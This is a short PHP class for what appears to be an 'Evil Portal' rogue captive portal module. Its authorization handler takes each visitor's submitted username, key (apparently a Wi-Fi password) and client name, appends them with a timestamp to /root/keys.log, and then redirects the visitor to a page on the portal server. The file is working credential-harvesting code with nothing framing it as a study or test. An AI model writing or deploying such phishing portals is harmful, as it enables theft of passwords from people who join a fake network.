<?php namespace evilportal;

class MyPortal extends Portal
{

    public function handleAuthorization()
    {   

        // Call parent to handle basic authorization first
        parent::handleAuthorization();

        // handle form input or other extra things there
        $time = date("H:i:s");
        $info = "$_POST[username],$_POST[key],$time,$_POST[clientName]\n";
        file_put_contents("/root/keys.log", $info, FILE_APPEND);

        header("Location: http://".$_SERVER['SERVER_ADDR']."/19-20/");
    }

    /**
     * Override this to do something when the client is successfully authorized.
     * By default it just notifies the Web UI.
     */
    public function onSuccess()
    {
        // Calls default success message
        parent::onSuccess();
    }

    /**
     * If an error occurs then do something here.
     * Override to provide your own functionality.
     */
    public function showError()
    {
        // Calls default error message
        parent::showError();
    }
}
